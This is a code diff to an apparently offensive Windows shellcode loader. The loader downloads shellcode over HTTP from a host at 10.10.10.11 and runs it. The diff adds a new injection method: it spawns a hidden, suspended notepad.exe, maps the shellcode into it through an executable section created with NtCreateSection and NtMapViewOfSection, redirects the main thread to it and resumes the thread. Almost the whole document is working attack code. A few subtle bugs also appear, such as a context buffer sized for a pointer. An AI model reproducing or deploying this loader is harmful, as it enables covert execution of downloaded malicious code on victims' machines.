@@ -8,14 +8,49 @@
 #include <windows.h>
 #include <strsafe.h>
 #include <winhttp.h>
+#include <winternl.h>
 
 #pragma comment(lib, "winhttp.lib")
+
+typedef NTSTATUS(NTAPI *MyNtCreateSection)(
+    OUT PHANDLE SectionHandle,
+    IN ULONG DesiredAccess,
+    IN OPTIONAL POBJECT_ATTRIBUTES ObjectAttributes,
+    IN OPTIONAL PLARGE_INTEGER MaximumSize,
+    IN ULONG PageAttributess,
+    IN ULONG SectionAttributes,
+    IN OPTIONAL HANDLE FileHandle
+);
+
+typedef NTSTATUS(NTAPI *MyNtMapViewOfSection)(
+    IN HANDLE SectionHandle,
+    IN HANDLE ProcessHandle,
+    IN OUT PVOID* BaseAddress,
+    IN ULONG_PTR ZeroBits,
+    IN SIZE_T CommitSize,
+    IN OUT OPTIONAL PLARGE_INTEGER SectionOffset,
+    IN OUT PSIZE_T ViewSize,
+    IN DWORD InheritDisposition,
+    IN ULONG AllocationType,
+    IN ULONG Win32Protect
+);
+
+typedef NTSTATUS(NTAPI* MyNtUnmapViewOfSection)(
+    IN HANDLE ProcessHandle,
+    IN PVOID BaseAddress OPTIONAL
+);
+
+typedef enum _SECTION_INHERIT : DWORD {
+    ViewShare = 1,
+    ViewUnmap = 2
+} SECTION_INHERIT, *PSECTION_INHERIT;
 
 enum InjectionType {
     INJECTION_TYPE_FUNCTION_POINTER,
     INJECTION_TYPE_CREATE_THREAD,
     INJECTION_TYPE_CREATE_REMOTE_THREAD,
-    INJECTION_TYPE_QUEUE_USER_APC
+    INJECTION_TYPE_QUEUE_USER_APC,
+    INJECTION_TYPE_NT_MAP_VIEW_OF_SECTION
 };
 
 void dprintf(
@@ -58,7 +93,7 @@ void dprintfWithLastError(
     printLastError();
 }
 
-BYTE* download(LPCWSTR host, DWORD port, LPCWSTR httpPath, DWORD* dwLength) {
+BYTE* download(LPCWSTR host, DWORD port, BOOL useTls, LPCWSTR httpPath, DWORD* dwLength) {
     HINTERNET hSession = NULL;
     HINTERNET hConnect = NULL;
     HINTERNET hRequest = NULL;
@@ -70,7 +105,7 @@ BYTE* download(LPCWSTR host, DWORD port, LPCWSTR httpPath, DWORD* dwLength) {
                 WINHTTP_ACCESS_TYPE_AUTOMATIC_PROXY,
                 WINHTTP_NO_PROXY_NAME,
                 WINHTTP_NO_PROXY_BYPASS,
-                0 // XXX: If using 443: WINHTTP_FLAG_SECURE_DEFAULTS // Require TLS 1.2 by default
+                0 // For visual studio 2022 - useTls ? WINHTTP_FLAG_SECURE_DEFAULTS : 0 - If secure (i.e.) port 443 - Require TLS 1.2 by default
         );
 
         if (!hSession) {
@@ -99,7 +134,7 @@ BYTE* download(LPCWSTR host, DWORD port, LPCWSTR httpPath, DWORD* dwLength) {
                 NULL, // Use HTTP 1.1
                 WINHTTP_NO_REFERER,
                 WINHTTP_DEFAULT_ACCEPT_TYPES,
-                0 // XXX: For 443 use: WINHTTP_FLAG_SECURE
+                useTls ? WINHTTP_FLAG_SECURE : 0 // If secure (i.e. port 443) use WINHTTP_FLAG_SECURE
         );
 
         if (!hRequest) {
@@ -112,7 +147,7 @@ BYTE* download(LPCWSTR host, DWORD port, LPCWSTR httpPath, DWORD* dwLength) {
                 hRequest,
                 WINHTTP_NO_ADDITIONAL_HEADERS, // No headers
                 0, // No header length
-                WINHTTP_NO_REQUEST_DATA, // No body
+                WINHTTP_NO_REQUEST_DATA, // No http body
                 0, // No optional data
                 0, // 0 total length
                 0 // No callbacks
@@ -468,9 +503,175 @@ int injectShellcodeWithQueueUserAPC(BYTE* shellcode, DWORD dwShellcodeLength) {
     return 1;
 }
 
+// Instead of injecting into an existing process, we'll spawn our own process in a suspended state
+// Then inject the shellcode, and then qeueu a call to the shellcode on its primary thread
+// We use NtCreateSection and NtMapViewOfSection as alternaties for VirtualAllocEx and WriteProcessMemory
+int injectShellcodeWithNtMapViewOfSection(BYTE* shellcode, DWORD dwShellcodeLength) {
+    HMODULE hNtdll = GetModuleHandle(L"ntdll.dll");
+
+    // Find NtCreateSection - As an alternative to VirtualAllocEx
+    FARPROC hNtCreateSection = GetProcAddress(hNtdll, "NtCreateSection");
+    MyNtCreateSection myNtCreateSection = (MyNtCreateSection) hNtCreateSection;
+
+    // Find NtMapViewOfSection
+    FARPROC hNtMapViewOfSection = GetProcAddress(hNtdll, "NtMapViewOfSection");
+    MyNtMapViewOfSection myNtMapViewOfSection = (MyNtMapViewOfSection) hNtMapViewOfSection;
+
+    // Find NtUnmapViewOfSection
+    FARPROC hNtUnmapViewOfSection = GetProcAddress(hNtdll, "NtUnmapViewOfSection");
+    MyNtUnmapViewOfSection myNtUnmapViewOfSection = (MyNtUnmapViewOfSection) hNtUnmapViewOfSection;
+
+    // Create the new process - notepad.exe for now, but with CREATE_NO_WINDOW
+    wchar_t lpApplicationName[] = L"C:\\Windows\\notepad.exe";
+    wchar_t* lpCommandLine = NULL;
+    // Inherit
+    LPSECURITY_ATTRIBUTES processAttributes = NULL;
+    LPSECURITY_ATTRIBUTES threadAttributes = NULL;
+    BOOL bInheritHandles = FALSE;
+    // CREATE_SUSPENDED is important:
+    DWORD dwCreationFlags = CREATE_NO_WINDOW | CREATE_SUSPENDED;
+    LPVOID lpEnvironment = NULL;
+
+    LPCWSTR lpCurrentDirectory = NULL;
+    STARTUPINFO startupInfo = { 0 };
+    startupInfo.cb = sizeof(startupInfo);
+    startupInfo.dwFlags = STARTF_USESHOWWINDOW;
+    PROCESS_INFORMATION processInformation = { 0 };
+    BOOL success;
+    success = CreateProcessW(
+            lpApplicationName,
+            lpCommandLine,
+            processAttributes,
+            threadAttributes,
+            bInheritHandles,
+            dwCreationFlags,
+            lpEnvironment,
+            lpCurrentDirectory,
+            &startupInfo,
+            &processInformation
+    );
+
+    if (!success) {
+        printf("[x] Failed to create process\n");
+        goto error;
+    }
+
+    printf("dwProcessId=%ld\n", processInformation.dwProcessId);
+    printf("dwThreadId=%ld\n", processInformation.dwThreadId);
+    printf("hProcess=0x%p\n",processInformation.hProcess);
+    printf("hThread=0x%p\n", processInformation.hThread);
+
+    // Create a section in the local process
+    HANDLE hSection = NULL;
+    LARGE_INTEGER szSection = { dwShellcodeLength };
+
+    NTSTATUS status = myNtCreateSection(
+        &hSection,
+        SECTION_ALL_ACCESS,
+        NULL, // Default object attributes
+        &szSection,
+        PAGE_EXECUTE_READWRITE,
+        SEC_COMMIT,
+        NULL // FileHandle, NULL - backed by the paging file
+    );
+
+    if(!NT_SUCCESS(status)) {
+        dprintf(L"Failed creating section\n");
+        goto error;
+    }
+
+    // Map the sectoin into memory of local process
+    PVOID hLocalAddress = NULL;
+    SIZE_T viewSize = 0;
+
+    status = myNtMapViewOfSection(
+        hSection,
+        GetCurrentProcess(),
+        &hLocalAddress,
+        0, // ZeroBits - Not used, as hLocalAddress is null
+        0, // Commit size
+        NULL, // SectionOffset
+        &viewSize, // Store the created view size
+        ViewShare, // The view will be mapped into any child processes created in the future
+        0, // Allocation type
+        PAGE_EXECUTE_READWRITE
+    );
+
+    if (!NT_SUCCESS(status)) {
+        dprintfWithLastError(L"Failed to map view of section to local process");
+        goto error;
+    }
+
+    dprintf(L"Allocated memory location: 0x%p\n", hLocalAddress);
+
+    // Copy the shellcode into the local memory location
+    RtlCopyMemory(hLocalAddress, shellcode, dwShellcodeLength);
+
+    // map section into memory of remote process
+    PVOID hRemoteAddress = NULL;
+
+    status = myNtMapViewOfSection(
+        hSection,
+        processInformation.hProcess,
+        &hRemoteAddress,
+        0, // ZeroBits - Not used, as hLocalAddress is null
+        0, // Commit size
+        NULL, // SectionOffset
+        &viewSize, // Store the created view size
+        ViewShare, // The view will be mapped into any child processes created in the future
+        0, // Allocation type
+        PAGE_EXECUTE_READWRITE
+    );
+
+    if (!NT_SUCCESS(status)) {
+        dprintfWithLastError(L"Failed to map view of section to local process");
+        goto error;
+    }
+
+    // Get context of main thread
+    LPCONTEXT pContext = (LPCONTEXT) malloc(sizeof(LPCONTEXT));
+    //RtlZeroMemory(pContext, sizeof(CONTEXT));
+    pContext->ContextFlags = CONTEXT_INTEGER;
+    if(!GetThreadContext(processInformation.hThread, pContext)) {
+        dprintfWithLastError(L"Failed to get thread context");
+        goto error;
+    }
+
+    // Update rcx context - which is the virtual address of entry point
+    pContext->Rcx = (DWORD64) hRemoteAddress;
+    SetThreadContext(processInformation.hThread, pContext);
+
+    // Resume the process that we originally suspended
+    ResumeThread(processInformation.hThread);
+
+    // Unnmap memory from local process
+    status = hNtUnmapViewOfSection(
+        GetCurrentProcess(),
+        hLocalAddress
+    );
+
+    if (!NT_SUCCESS(status)) {
+        dprintfWithLastError(L"Failed to unmap view of section to local process");
+        goto error;
+    }
+
+    // Close process and thread handles seems to crash on program exit
+    //if (pContext) {
+    //    free(pContext);
+    //}
+    //CloseHandle(processInformation.hProcess);
+    //CloseHandle(processInformation.hThread);
+    return 0;
+error:
+    printLastError();
+
+    return 1;
+}
+
 int main() {
     DWORD dwShellcodeLength = 0;
-    BYTE* shellcode = download(L"10.10.10.11", 8000, L"/shellcode.bin", &dwShellcodeLength);
+    BOOL useTls = FALSE;
+    BYTE* shellcode = download(L"10.10.10.11", 8000, useTls, L"/shellcode.bin", &dwShellcodeLength);
     if (!shellcode) {
         dprintf(L"failed downloading shellcode\n");
         return 1;
@@ -479,7 +680,7 @@ int main() {
     dprintf(L"shellcode location: %p\n", shellcode);
     //hexdump(shellcode, dwShellcodeLength);
 
-    enum InjectionType injectionType = INJECTION_TYPE_QUEUE_USER_APC;
+    enum InjectionType injectionType = INJECTION_TYPE_NT_MAP_VIEW_OF_SECTION;
 
     switch (injectionType) {
         case INJECTION_TYPE_FUNCTION_POINTER: {
@@ -497,8 +698,14 @@ int main() {
             injectShellcodeWithQueueUserAPC(shellcode, dwShellcodeLength);
             break;
         }
+        case INJECTION_TYPE_NT_MAP_VIEW_OF_SECTION: {
+            injectShellcodeWithNtMapViewOfSection(shellcode, dwShellcodeLength);
+            break;
+        }
         default:
             dprintf(L"Unknown injection type");
             break;
     }
+
+    return 0;
 }
